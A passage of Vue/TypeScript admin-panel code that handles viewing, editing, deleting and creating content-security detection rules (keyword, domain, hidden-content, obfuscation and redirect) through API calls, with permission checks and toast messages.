const selectedHiddenContentRule = ref<HiddenContentRuleDetail | null>(null);
const editingHiddenContentRuleId = ref<number | null>(null);
const isSubmittingHiddenContentEdit = ref(false);
const isDeletingHiddenContentRule = ref(false);
const deletingHiddenContentRule = ref<{ id: number; pattern: string } | null>(null);

const hiddenContentEditForm = ref<{
  pattern: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
}>({
  pattern: '',
  category: 'HIDDEN_CONTENT',
  severity: 'HIGH',
  is_enabled: true,
  description: ''
});

const originalHiddenContentRuleData = ref<{
  pattern: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
} | null>(null);

const hiddenContentModalState = useAdminModalState<HiddenContentRuleDetail>({
  getItems: async (id) => {
    if (rulesSubTab.value !== 'hidden_content') return null;
    isHiddenContentDetailsLoading.value = true;
    try {
      const details = await contentSecurityService.getHiddenContentRuleDetails(String(id));
      return details;
    } catch (err: any) {
      const msg = extractErrorMessage(err, 'Failed to retrieve hidden content rule details.');
      toastError(msg);
      return null;
    } finally {
      isHiddenContentDetailsLoading.value = false;
    }
  },
  onResolveError: (id) => {
    if (rulesSubTab.value === 'hidden_content') {
      toastError(`Hidden Content Rule #${id} could not be resolved.`);
      hiddenContentModalState.closeModal({ replace: true });
    }
  }
});

watch(() => hiddenContentModalState.activeEntity.value, (newEntity) => {
  if (newEntity && rulesSubTab.value === 'hidden_content') {
    selectedHiddenContentRule.value = newEntity;

    if (hiddenContentModalState.isEdit.value) {
      if (!canEditHiddenContentRule.value) {
        toastError('You do not have permission to edit hidden content rules.');
        hiddenContentModalState.closeModal({ replace: true });
        return;
      }
      editingHiddenContentRuleId.value = newEntity.id;
      hiddenContentEditForm.value = {
        pattern: newEntity.pattern || '',
        category: newEntity.category || 'HIDDEN_CONTENT',
        severity: newEntity.severity || 'HIGH',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
      originalHiddenContentRuleData.value = {
        pattern: newEntity.pattern || '',
        category: newEntity.category || 'HIDDEN_CONTENT',
        severity: newEntity.severity || 'HIGH',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
    }

    if (hiddenContentModalState.isDelete.value) {
      if (!canDeleteHiddenContentRule.value) {
        toastError('You do not have permission to delete hidden content rules.');
        hiddenContentModalState.closeModal({ replace: true });
        return;
      }
      if (!deletingHiddenContentRule.value) {
        deletingHiddenContentRule.value = {
          id: newEntity.id,
          pattern: newEntity.pattern || `Rule #${newEntity.id}`
        };
      }
    }
  }
}, { immediate: true });

watch(() => hiddenContentModalState.isView.value, (isView) => {
  if (!isView && !hiddenContentModalState.isEdit.value && !hiddenContentModalState.isDelete.value) {
    selectedHiddenContentRule.value = null;
  }
}, { immediate: true });

watch(() => hiddenContentModalState.isEdit.value, (isEdit) => {
  if (!isEdit) {
    editingHiddenContentRuleId.value = null;
    originalHiddenContentRuleData.value = null;
  }
}, { immediate: true });

watch(() => hiddenContentModalState.isDelete.value, (isDelete) => {
  if (!isDelete) {
    deletingHiddenContentRule.value = null;
  } else if (!canDeleteHiddenContentRule.value) {
    toastError('You do not have permission to delete hidden content rules.');
    hiddenContentModalState.closeModal({ replace: true });
  }
}, { immediate: true });

const openHiddenContentViewModal = (id: number | string) => {
  if (!canViewHiddenContent.value) {
    toastError('You do not have permission to view hidden content rules.');
    return;
  }
  hiddenContentModalState.openView(id);
};

const closeHiddenContentViewModal = () => {
  hiddenContentModalState.closeModal();
};

const openEditHiddenContentRuleModal = async (id: number | string) => {
  if (!canEditHiddenContentRule.value) {
    toastError('You do not have permission to edit hidden content rules.');
    return;
  }
  await hiddenContentModalState.openEdit(id);
};

const closeHiddenContentEditModal = async () => {
  await hiddenContentModalState.closeModal();
};

const openDeleteHiddenContentRuleModal = async (rule: { id: number; pattern?: string }) => {
  if (!canDeleteHiddenContentRule.value) {
    toastError('You do not have permission to delete hidden content rules.');
    return;
  }
  deletingHiddenContentRule.value = {
    id: rule.id,
    pattern: rule.pattern || `Rule #${rule.id}`
  };
  await hiddenContentModalState.openDelete(rule.id);
};

const closeHiddenContentDeleteModal = async () => {
  await hiddenContentModalState.closeModal();
};

const executeDeleteHiddenContentRule = async () => {
  if (!canDeleteHiddenContentRule.value) {
    toastError('You do not have permission to delete hidden content rules.');
    return;
  }

  const targetId = deletingHiddenContentRule.value?.id || hiddenContentModalState.activeId.value;
  if (!targetId) {
    toastError('Hidden content rule identifier missing.');
    return;
  }

  if (isDeletingHiddenContentRule.value) return;

  isDeletingHiddenContentRule.value = true;
  try {
    await contentSecurityService.deleteHiddenContentRule(targetId);
    toastSuccess(`Hidden content rule "${deletingHiddenContentRule.value?.pattern || `#${targetId}`}" deleted successfully.`);
    await closeHiddenContentDeleteModal();
    await fetchHiddenContentRules();

    if (hiddenContentRulesData.value.length === 0 && hiddenContentPage.value > 1) {
      hiddenContentPage.value = Math.max(1, hiddenContentPage.value - 1);
      await fetchHiddenContentRules();
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to delete hidden content rule.');
    toastError(msg);
  } finally {
    isDeletingHiddenContentRule.value = false;
  }
};

const submitUpdateHiddenContentRule = async () => {
  if (!canEditHiddenContentRule.value) {
    toastError('You do not have permission to edit hidden content rules.');
    return;
  }

  if (!editingHiddenContentRuleId.value) {
    toastError('Hidden content rule identifier missing.');
    return;
  }

  const trimmedPattern = hiddenContentEditForm.value.pattern.trim();
  if (!trimmedPattern) {
    toastError('CSS pattern / declaration is required.');
    return;
  }

  const payload: UpdateHiddenContentRulePayload = {};
  const orig = originalHiddenContentRuleData.value;
  const current = hiddenContentEditForm.value;

  if (orig) {
    if (trimmedPattern !== orig.pattern.trim()) {
      payload.pattern = trimmedPattern;
    }
    if (current.category !== orig.category) {
      payload.category = current.category;
    }
    if (current.severity !== orig.severity) {
      payload.severity = current.severity;
    }
    if (Boolean(current.is_enabled) !== Boolean(orig.is_enabled)) {
      payload.is_enabled = current.is_enabled;
    }
    const currentDesc = current.description.trim();
    const origDesc = (orig.description || '').trim();
    if (currentDesc !== origDesc) {
      payload.description = currentDesc;
    }
  } else {
    payload.pattern = trimmedPattern;
    payload.category = current.category;
    payload.severity = current.severity;
    payload.is_enabled = current.is_enabled;
    payload.description = current.description.trim();
  }

  if (Object.keys(payload).length === 0) {
    toastInfo('No changes detected.');
    await closeHiddenContentEditModal();
    return;
  }

  if (isSubmittingHiddenContentEdit.value) return;

  isSubmittingHiddenContentEdit.value = true;
  try {
    const updated = await contentSecurityService.updateHiddenContentRule(editingHiddenContentRuleId.value, payload);
    toastSuccess('Hidden content rule updated successfully.');
    await closeHiddenContentEditModal();
    await fetchHiddenContentRules();

    if (selectedHiddenContentRule.value && String(selectedHiddenContentRule.value.id) === String(updated.id)) {
      selectedHiddenContentRule.value = updated;
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to update hidden content rule.');
    toastError(msg);
  } finally {
    isSubmittingHiddenContentEdit.value = false;
  }
};

// ==========================================
// Modal State: Obfuscation Rule Details (View), Edit & Delete
// ==========================================
const isObfuscationDetailsLoading = ref(false);
const selectedObfuscationRule = ref<ObfuscationRuleDetail | null>(null);
const editingObfuscationRuleId = ref<number | null>(null);
const isSubmittingObfuscationEdit = ref(false);
const isDeletingObfuscationRule = ref(false);
const deletingObfuscationRule = ref<{ id: number; pattern?: string } | null>(null);

const obfuscationEditForm = ref<{
  pattern: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
}>({
  pattern: '',
  category: 'OBFUSCATION',
  severity: 'HIGH',
  is_enabled: true,
  description: ''
});

const originalObfuscationRuleData = ref<{
  pattern: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
} | null>(null);

const obfuscationModalState = useAdminModalState<ObfuscationRuleDetail>({
  getItems: async (id) => {
    if (rulesSubTab.value !== 'obfuscation') return null;
    isObfuscationDetailsLoading.value = true;
    try {
      const details = await contentSecurityService.getObfuscationRuleDetails(String(id));
      return details;
    } catch (err: any) {
      const msg = extractErrorMessage(err, 'Failed to retrieve obfuscation rule details.');
      toastError(msg);
      return null;
    } finally {
      isObfuscationDetailsLoading.value = false;
    }
  },
  onResolveError: (id) => {
    if (rulesSubTab.value === 'obfuscation') {
      toastError(`Obfuscation Rule #${id} could not be resolved.`);
      obfuscationModalState.closeModal({ replace: true });
    }
  }
});

watch(() => obfuscationModalState.activeEntity.value, (newEntity) => {
  if (newEntity && rulesSubTab.value === 'obfuscation') {
    selectedObfuscationRule.value = newEntity;

    if (obfuscationModalState.isEdit.value) {
      if (!canEditObfuscationRule.value) {
        toastError('You do not have permission to edit obfuscation rules.');
        obfuscationModalState.closeModal({ replace: true });
        return;
      }
      editingObfuscationRuleId.value = newEntity.id;
      obfuscationEditForm.value = {
        pattern: newEntity.pattern || '',
        category: newEntity.category || 'OBFUSCATION',
        severity: newEntity.severity || 'HIGH',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
      originalObfuscationRuleData.value = {
        pattern: newEntity.pattern || '',
        category: newEntity.category || 'OBFUSCATION',
        severity: newEntity.severity || 'HIGH',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
    }

    if (obfuscationModalState.isDelete.value) {
      if (!canDeleteObfuscationRule.value) {
        toastError('You do not have permission to delete obfuscation rules.');
        obfuscationModalState.closeModal({ replace: true });
        return;
      }
      if (!deletingObfuscationRule.value) {
        deletingObfuscationRule.value = {
          id: newEntity.id,
          pattern: newEntity.pattern || `Rule #${newEntity.id}`
        };
      }
    }
  }
}, { immediate: true });

watch(() => obfuscationModalState.isView.value, (isView) => {
  if (!isView && !obfuscationModalState.isEdit.value && !obfuscationModalState.isDelete.value) {
    selectedObfuscationRule.value = null;
  }
}, { immediate: true });

watch(() => obfuscationModalState.isEdit.value, (isEdit) => {
  if (!isEdit) {
    editingObfuscationRuleId.value = null;
    originalObfuscationRuleData.value = null;
  }
}, { immediate: true });

watch(() => obfuscationModalState.isDelete.value, (isDelete) => {
  if (!isDelete) {
    deletingObfuscationRule.value = null;
  } else if (!canDeleteObfuscationRule.value) {
    toastError('You do not have permission to delete obfuscation rules.');
    obfuscationModalState.closeModal({ replace: true });
  }
}, { immediate: true });

const openObfuscationViewModal = (id: number | string) => {
  if (!canViewObfuscation.value) {
    toastError('You do not have permission to view obfuscation rules.');
    return;
  }
  obfuscationModalState.openView(id);
};

const closeObfuscationViewModal = () => {
  obfuscationModalState.closeModal();
};

const openEditObfuscationRuleModal = async (id: number | string) => {
  if (!canEditObfuscationRule.value) {
    toastError('You do not have permission to edit obfuscation rules.');
    return;
  }
  await obfuscationModalState.openEdit(id);
};

const closeObfuscationEditModal = async () => {
  await obfuscationModalState.closeModal();
};

const submitUpdateObfuscationRule = async () => {
  if (!canEditObfuscationRule.value) {
    toastError('You do not have permission to edit obfuscation rules.');
    return;
  }

  if (!editingObfuscationRuleId.value) {
    toastError('Obfuscation rule identifier missing.');
    return;
  }

  const trimmedPattern = obfuscationEditForm.value.pattern.trim();
  if (!trimmedPattern) {
    toastError('Pattern / regex is required.');
    return;
  }

  const payload: UpdateObfuscationRulePayload = {};
  const orig = originalObfuscationRuleData.value;
  const current = obfuscationEditForm.value;

  if (orig) {
    if (trimmedPattern !== orig.pattern.trim()) {
      payload.pattern = trimmedPattern;
    }
    if (current.category !== orig.category) {
      payload.category = current.category;
    }
    if (current.severity !== orig.severity) {
      payload.severity = current.severity;
    }
    if (Boolean(current.is_enabled) !== Boolean(orig.is_enabled)) {
      payload.is_enabled = current.is_enabled;
    }
    const currentDesc = current.description.trim();
    const origDesc = (orig.description || '').trim();
    if (currentDesc !== origDesc) {
      payload.description = currentDesc;
    }
  } else {
    payload.pattern = trimmedPattern;
    payload.category = current.category;
    payload.severity = current.severity;
    payload.is_enabled = current.is_enabled;
    payload.description = current.description.trim();
  }

  if (Object.keys(payload).length === 0) {
    toastInfo('No changes detected.');
    await closeObfuscationEditModal();
    return;
  }

  if (isSubmittingObfuscationEdit.value) return;

  isSubmittingObfuscationEdit.value = true;
  try {
    const updated = await contentSecurityService.updateObfuscationRule(editingObfuscationRuleId.value, payload);
    toastSuccess('Obfuscation rule updated successfully.');
    await closeObfuscationEditModal();
    await fetchObfuscationRules();

    if (selectedObfuscationRule.value && String(selectedObfuscationRule.value.id) === String(updated.id)) {
      selectedObfuscationRule.value = updated;
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to update obfuscation rule.');
    toastError(msg);
  } finally {
    isSubmittingObfuscationEdit.value = false;
  }
};

const openDeleteObfuscationRuleModal = async (rule: { id: number; pattern?: string }) => {
  if (!canDeleteObfuscationRule.value) {
    toastError('You do not have permission to delete obfuscation rules.');
    return;
  }
  deletingObfuscationRule.value = {
    id: rule.id,
    pattern: rule.pattern || `Rule #${rule.id}`
  };
  await obfuscationModalState.openDelete(rule.id);
};

const closeObfuscationDeleteModal = async () => {
  await obfuscationModalState.closeModal();
};

const executeDeleteObfuscationRule = async () => {
  if (!canDeleteObfuscationRule.value) {
    toastError('You do not have permission to delete obfuscation rules.');
    return;
  }

  const targetId = deletingObfuscationRule.value?.id || obfuscationModalState.activeId.value;
  if (!targetId) {
    toastError('Obfuscation rule identifier missing.');
    return;
  }

  if (isDeletingObfuscationRule.value) return;

  isDeletingObfuscationRule.value = true;
  try {
    await contentSecurityService.deleteObfuscationRule(targetId);
    toastSuccess(`Obfuscation rule "${deletingObfuscationRule.value?.pattern || `#${targetId}`}" deleted successfully.`);
    await closeObfuscationDeleteModal();
    await fetchObfuscationRules();

    if (obfuscationRulesData.value.length === 0 && obfuscationPage.value > 1) {
      obfuscationPage.value = Math.max(1, obfuscationPage.value - 1);
      await fetchObfuscationRules();
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to delete obfuscation rule.');
    toastError(msg);
  } finally {
    isDeletingObfuscationRule.value = false;
  }
};

const openEditDomainRuleModal = async (id: number | string) => {
  if (!canEditDomainRule.value) {
    toastError('You do not have permission to edit domain rules.');
    return;
  }
  await domainModalState.openEdit(id);
};

const closeDomainEditModal = async () => {
  await domainModalState.closeModal();
};

const openDeleteDomainRuleModal = async (rule: { id: number; domain?: string }) => {
  if (!canDeleteDomainRule.value) {
    toastError('You do not have permission to delete domain rules.');
    return;
  }
  deletingDomainRule.value = {
    id: rule.id,
    domain: rule.domain || `Rule #${rule.id}`
  };
  await domainModalState.openDelete(rule.id);
};

const closeDomainDeleteModal = async () => {
  await domainModalState.closeModal();
};

const executeDeleteDomainRule = async () => {
  if (!canDeleteDomainRule.value) {
    toastError('You do not have permission to delete domain rules.');
    return;
  }

  const targetId = deletingDomainRule.value?.id || domainModalState.activeId.value;
  if (!targetId) {
    toastError('Domain rule identifier missing.');
    return;
  }

  if (isDeletingDomainRule.value) return;

  isDeletingDomainRule.value = true;
  try {
    await contentSecurityService.deleteDomainRule(targetId);
    toastSuccess(`Domain rule "${deletingDomainRule.value?.domain || `#${targetId}`}" deleted successfully.`);
    await closeDomainDeleteModal();
    await fetchDomainRules();

    if (domainRulesData.value.length === 0 && domainPage.value > 1) {
      domainPage.value = Math.max(1, domainPage.value - 1);
      await fetchDomainRules();
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to delete domain rule.');
    toastError(msg);
  } finally {
    isDeletingDomainRule.value = false;
  }
};

const submitUpdateDomainRule = async () => {
  if (!canEditDomainRule.value) {
    toastError('You do not have permission to edit domain rules.');
    return;
  }

  if (!editingDomainRuleId.value) {
    toastError('Domain rule identifier missing.');
    return;
  }

  const trimmedDomain = domainEditForm.value.domain.trim();
  if (!trimmedDomain) {
    toastError('Domain is required.');
    return;
  }

  const payload: UpdateDomainRulePayload = {};
  const orig = originalDomainRuleData.value;
  const current = domainEditForm.value;

  if (orig) {
    if (trimmedDomain !== orig.domain.trim()) {
      payload.domain = trimmedDomain;
    }
    if (current.category !== orig.category) {
      payload.category = current.category;
    }
    if (current.severity !== orig.severity) {
      payload.severity = current.severity;
    }
    if (current.match_type !== orig.match_type) {
      payload.match_type = current.match_type;
    }
    if (Boolean(current.is_enabled) !== Boolean(orig.is_enabled)) {
      payload.is_enabled = current.is_enabled;
    }
    const currentDesc = current.description.trim();
    const origDesc = (orig.description || '').trim();
    if (currentDesc !== origDesc) {
      payload.description = currentDesc;
    }
  } else {
    payload.domain = trimmedDomain;
    payload.category = current.category;
    payload.severity = current.severity;
    payload.match_type = current.match_type;
    payload.is_enabled = current.is_enabled;
    payload.description = current.description.trim();
  }

  if (Object.keys(payload).length === 0) {
    toastInfo('No changes detected.');
    await closeDomainEditModal();
    return;
  }

  isSubmittingDomainEdit.value = true;
  try {
    const updated = await contentSecurityService.updateDomainRule(editingDomainRuleId.value, payload);
    toastSuccess('Domain rule updated successfully.');
    await closeDomainEditModal();
    await fetchDomainRules();

    if (selectedDomainRule.value && String(selectedDomainRule.value.id) === String(updated.id)) {
      selectedDomainRule.value = updated;
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to update domain rule.');
    toastError(msg);
  } finally {
    isSubmittingDomainEdit.value = false;
  }
};

const openEditKeywordRuleModal = async (id: number | string) => {
  if (!canEditKeywordRule.value) {
    toastError('You do not have permission to edit keyword rules.');
    return;
  }
  await keywordModalState.openEdit(id);
};

const closeKeywordEditModal = async () => {
  await keywordModalState.closeModal();
};

const openDeleteKeywordRuleModal = async (rule: { id: number; keyword?: string }) => {
  if (!canDeleteKeywordRule.value) {
    toastError('You do not have permission to delete keyword rules.');
    return;
  }
  deletingKeywordRule.value = {
    id: rule.id,
    keyword: rule.keyword || `Rule #${rule.id}`
  };
  await keywordModalState.openDelete(rule.id);
};

const closeKeywordDeleteModal = async () => {
  await keywordModalState.closeModal();
};

const executeDeleteKeywordRule = async () => {
  if (!canDeleteKeywordRule.value) {
    toastError('You do not have permission to delete keyword rules.');
    return;
  }

  const targetId = deletingKeywordRule.value?.id || keywordModalState.activeId.value;
  if (!targetId) {
    toastError('Keyword rule identifier missing.');
    return;
  }

  if (isDeletingKeywordRule.value) return;

  isDeletingKeywordRule.value = true;
  try {
    await contentSecurityService.deleteKeywordRule(targetId);
    toastSuccess(`Keyword rule "${deletingKeywordRule.value?.keyword || `#${targetId}`}" deleted successfully.`);
    await closeKeywordDeleteModal();
    await fetchKeywordRules();

    if (keywordRulesData.value.length === 0 && keywordPage.value > 1) {
      keywordPage.value = Math.max(1, keywordPage.value - 1);
      await fetchKeywordRules();
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to delete keyword rule.');
    toastError(msg);
  } finally {
    isDeletingKeywordRule.value = false;
  }
};

const submitUpdateKeywordRule = async () => {
  if (!canEditKeywordRule.value) {
    toastError('You do not have permission to edit keyword rules.');
    return;
  }

  if (!editingKeywordRuleId.value) {
    toastError('Keyword rule identifier missing.');
    return;
  }

  const trimmedKeyword = keywordEditForm.value.keyword.trim();
  if (!trimmedKeyword) {
    toastError('Keyword is required.');
    return;
  }

  const payload: UpdateKeywordRulePayload = {};
  const orig = originalKeywordRuleData.value;
  const current = keywordEditForm.value;

  if (orig) {
    if (trimmedKeyword !== orig.keyword.trim()) {
      payload.keyword = trimmedKeyword;
    }
    if (current.category !== orig.category) {
      payload.category = current.category;
    }
    if (current.severity !== orig.severity) {
      payload.severity = current.severity;
    }
    if (current.match_type !== orig.match_type) {
      payload.match_type = current.match_type;
    }
    if (Boolean(current.is_enabled) !== Boolean(orig.is_enabled)) {
      payload.is_enabled = current.is_enabled;
    }
    const currentDesc = current.description.trim();
    const origDesc = (orig.description || '').trim();
    if (currentDesc !== origDesc) {
      payload.description = currentDesc;
    }
  } else {
    payload.keyword = trimmedKeyword;
    payload.category = current.category;
    payload.severity = current.severity;
    payload.match_type = current.match_type;
    payload.is_enabled = current.is_enabled;
    payload.description = current.description.trim();
  }

  if (Object.keys(payload).length === 0) {
    toastInfo('No changes detected.');
    await closeKeywordEditModal();
    return;
  }

  isSubmittingKeywordEdit.value = true;
  try {
    const updated = await contentSecurityService.updateKeywordRule(editingKeywordRuleId.value, payload);
    toastSuccess('Keyword rule updated successfully.');
    await closeKeywordEditModal();
    await fetchKeywordRules();

    if (selectedKeywordRule.value && String(selectedKeywordRule.value.id) === String(updated.id)) {
      selectedKeywordRule.value = updated;
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to update keyword rule.');
    toastError(msg);
  } finally {
    isSubmittingKeywordEdit.value = false;
  }
};

const formatUserInfo = (userVal: any): string => {
  if (!userVal) return 'N/A';
  if (typeof userVal === 'string') return userVal;
  if (typeof userVal === 'number') return `User #${userVal}`;
  if (typeof userVal === 'object') {
    if (userVal.first_name || userVal.last_name) {
      return `${userVal.first_name || ''} ${userVal.last_name || ''}`.trim();
    }
    if (userVal.username) return userVal.username;
    if (userVal.email) return userVal.email;
    if (userVal.id) return `User #${userVal.id}`;
  }
  return 'N/A';
};

// ==========================================
// Modal State: Add / Edit Rule
// ==========================================
const isRuleModalOpen = ref(false);
const editingRule = ref<DetectionRule | null>(null);
const isSubmittingKeywordRule = ref(false);
const isSubmittingDomainRule = ref(false);
const isSubmittingHiddenContentRule = ref(false);
const isSubmittingObfuscationRule = ref(false);
const isSubmittingRedirectRule = ref(false);

const keywordCreateForm = ref<{
  keyword: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  match_type: KeywordMatchType;
  is_enabled: boolean;
  description: string;
}>({
  keyword: '',
  category: 'SPAM',
  severity: 'HIGH',
  match_type: 'WORD',
  is_enabled: true,
  description: ''
});

const domainCreateForm = ref<{
  domain: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  match_type: DomainMatchType;
  is_enabled: boolean;
  description: string;
}>({
  domain: '',
  category: 'GAMBLING',
  severity: 'HIGH',
  match_type: 'EXACT',
  is_enabled: true,
  description: ''
});

const hiddenContentCreateForm = ref<{
  pattern: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
}>({
  pattern: '',
  category: 'HIDDEN_CONTENT',
  severity: 'HIGH',
  is_enabled: true,
  description: ''
});

const obfuscationCreateForm = ref<{
  pattern: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
}>({
  pattern: '',
  category: 'OBFUSCATION',
  severity: 'HIGH',
  is_enabled: true,
  description: ''
});

const redirectCreateForm = ref<{
  pattern: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
}>({
  pattern: '',
  category: 'REDIRECT',
  severity: 'HIGH',
  is_enabled: true,
  description: ''
});

const ruleForm = ref({
  type: 'keyword' as DetectionRule['type'],
  pattern: '',
  category: 'General',
  severity: 'High' as SecuritySeverity,
  description: '',
  enabled: true
});

const openAddRuleModal = (type: DetectionRule['type']) => {
  editingRule.value = null;
  if (type === 'keyword') {
    if (!canAddKeywordRule.value) {
      toastError('You do not have permission to add keyword rules.');
      return;
    }
    keywordCreateForm.value = {
      keyword: '',
      category: 'SPAM',
      severity: 'HIGH',
      match_type: 'WORD',
      is_enabled: true,
      description: ''
    };
  } else if (type === 'domain') {
    if (!canAddDomainRule.value) {
      toastError('You do not have permission to add domain rules.');
      return;
    }
    domainCreateForm.value = {
      domain: '',
      category: 'GAMBLING',
      severity: 'HIGH',
      match_type: 'EXACT',
      is_enabled: true,
      description: ''
    };
  } else if (type === 'hidden_content') {
    if (!canAddHiddenContentRule.value) {
      toastError('You do not have permission to add hidden content rules.');
      return;
    }
    hiddenContentCreateForm.value = {
      pattern: '',
      category: 'HIDDEN_CONTENT',
      severity: 'HIGH',
      is_enabled: true,
      description: ''
    };
  } else if (type === 'obfuscation') {
    if (!canAddObfuscationRule.value) {
      toastError('You do not have permission to add obfuscation rules.');
      return;
    }
    obfuscationCreateForm.value = {
      pattern: '',
      category: 'OBFUSCATION',
      severity: 'HIGH',
      is_enabled: true,
      description: ''
    };
  } else if (type === 'redirect') {
    if (!canAddRedirectRule.value) {
      toastError('You do not have permission to add redirect rules.');
      return;
    }
    redirectCreateForm.value = {
      pattern: '',
      category: 'REDIRECT',
      severity: 'HIGH',
      is_enabled: true,
      description: ''
    };
  }
  ruleForm.value = {
    type,
    pattern: '',
    category: type === 'keyword' ? 'Spam Blacklist' : type === 'domain' ? 'Malicious Domains' : type === 'hidden_content' ? 'Hidden Content' : type === 'obfuscation' ? 'Obfuscation Rules' : type === 'html' ? 'Disallowed Tags' : type === 'attribute' ? 'Event Handlers' : 'Redirects',
    severity: 'High',
    description: '',
    enabled: true
  };
  isRuleModalOpen.value = true;
};

const openEditRuleModal = (rule: DetectionRule) => {
  editingRule.value = rule;
  ruleForm.value = {
    type: rule.type,
    pattern: rule.pattern,
    category: rule.category,
    severity: rule.severity,
    description: rule.description,
    enabled: rule.enabled
  };
  isRuleModalOpen.value = true;
};

const saveRule = async () => {
  // Handle Real Keyword Rule Creation via API
  if (ruleForm.value.type === 'keyword' && !editingRule.value) {
    if (!canAddKeywordRule.value) {
      toastError('You do not have permission to add keyword rules.');
      return;
    }

    const trimmedKeyword = keywordCreateForm.value.keyword.trim();
    if (!trimmedKeyword) {
      toastError('Keyword is required.');
      return;
    }

    try {
      isSubmittingKeywordRule.value = true;
      const payload: CreateKeywordRulePayload = {
        keyword: trimmedKeyword,
        category: keywordCreateForm.value.category,
        severity: keywordCreateForm.value.severity,
        match_type: keywordCreateForm.value.match_type,
        is_enabled: keywordCreateForm.value.is_enabled,
        ...(keywordCreateForm.value.description?.trim() 
          ? { description: keywordCreateForm.value.description.trim() } 
          : {})
      };

      await contentSecurityService.createKeywordRule(payload);
      toastSuccess('Keyword rule created successfully.');
      isRuleModalOpen.value = false;
      await fetchKeywordRules();
    } catch (err: any) {
      toastError(err.message || 'Failed to create keyword rule.');
    } finally {
      isSubmittingKeywordRule.value = false;
    }
    return;
  }

  // Handle Real Domain Rule Creation via API
  if (ruleForm.value.type === 'domain' && !editingRule.value) {
    if (!canAddDomainRule.value) {
      toastError('You do not have permission to add domain rules.');
      return;
    }

    const trimmedDomain = domainCreateForm.value.domain.trim();
    if (!trimmedDomain) {
      toastError('Domain is required.');
      return;
    }

    try {
      isSubmittingDomainRule.value = true;
      const payload: CreateDomainRulePayload = {
        domain: trimmedDomain,
        category: domainCreateForm.value.category,
        severity: domainCreateForm.value.severity,
        match_type: domainCreateForm.value.match_type,
        is_enabled: domainCreateForm.value.is_enabled,
        ...(domainCreateForm.value.description?.trim() 
          ? { description: domainCreateForm.value.description.trim() } 
          : {})
      };

      await contentSecurityService.createDomainRule(payload);
      toastSuccess('Domain rule created successfully.');
      isRuleModalOpen.value = false;
      await fetchDomainRules();
    } catch (err: any) {
      toastError(err.message || 'Failed to create domain rule.');
    } finally {
      isSubmittingDomainRule.value = false;
    }
    return;
  }

  // Handle Real Hidden Content Rule Creation via API
  if (ruleForm.value.type === 'hidden_content' && !editingRule.value) {
    if (!canAddHiddenContentRule.value) {
      toastError('You do not have permission to add hidden content rules.');
      return;
    }

    const trimmedPattern = hiddenContentCreateForm.value.pattern.trim();
    if (!trimmedPattern) {
      toastError('CSS declaration / pattern is required.');
      return;
    }

    try {
      isSubmittingHiddenContentRule.value = true;
      const payload: CreateHiddenContentRulePayload = {
        pattern: trimmedPattern,
        category: hiddenContentCreateForm.value.category,
        severity: hiddenContentCreateForm.value.severity,
        is_enabled: hiddenContentCreateForm.value.is_enabled,
        ...(hiddenContentCreateForm.value.description?.trim() 
          ? { description: hiddenContentCreateForm.value.description.trim() } 
          : {})
      };

      await contentSecurityService.createHiddenContentRule(payload);
      toastSuccess('Hidden content rule created successfully.');
      isRuleModalOpen.value = false;
      await fetchHiddenContentRules();
    } catch (err: any) {
      toastError(err.message || 'Failed to create hidden content rule.');
    } finally {
      isSubmittingHiddenContentRule.value = false;
    }
    return;
  }

  // Handle Real Obfuscation Rule Creation via API
  if (ruleForm.value.type === 'obfuscation' && !editingRule.value) {
    if (!canAddObfuscationRule.value) {
      toastError('You do not have permission to add obfuscation rules.');
      return;
    }

    const trimmedPattern = obfuscationCreateForm.value.pattern.trim();
    if (!trimmedPattern) {
      toastError('Pattern / regex is required.');
      return;
    }

    try {
      isSubmittingObfuscationRule.value = true;
      const payload: CreateObfuscationRulePayload = {
        pattern: trimmedPattern,
        category: obfuscationCreateForm.value.category,
        severity: obfuscationCreateForm.value.severity,
        is_enabled: obfuscationCreateForm.value.is_enabled,
        ...(obfuscationCreateForm.value.description?.trim() 
          ? { description: obfuscationCreateForm.value.description.trim() } 
          : {})
      };

      await contentSecurityService.createObfuscationRule(payload);
      toastSuccess('Obfuscation rule created successfully.');
      isRuleModalOpen.value = false;
      await fetchObfuscationRules();
    } catch (err: any) {
      toastError(err.message || 'Failed to create obfuscation rule.');
    } finally {
      isSubmittingObfuscationRule.value = false;
    }
    return;
  }

  // Handle Real Redirect Rule Creation via API
  if (ruleForm.value.type === 'redirect' && !editingRule.value) {
    if (!canAddRedirectRule.value) {
      toastError('You do not have permission to add redirect rules.');
      return;
    }

    const trimmedPattern = redirectCreateForm.value.pattern.trim();
    if (!trimmedPattern) {
      toastError('Redirect pattern / heuristic is required.');
      return;
    }

    try {
      isSubmittingRedirectRule.value = true;
      const payload: CreateRedirectRulePayload = {
        pattern: trimmedPattern,
        category: redirectCreateForm.value.category,
        severity: redirectCreateForm.value.severity,
        is_enabled: redirectCreateForm.value.is_enabled,
        ...(redirectCreateForm.value.description?.trim() 
          ? { description: redirectCreateForm.value.description.trim() } 
          : {})
      };

      await contentSecurityService.createRedirectRule(payload);
      toastSuccess('Redirect rule created successfully.');
      isRuleModalOpen.value = false;
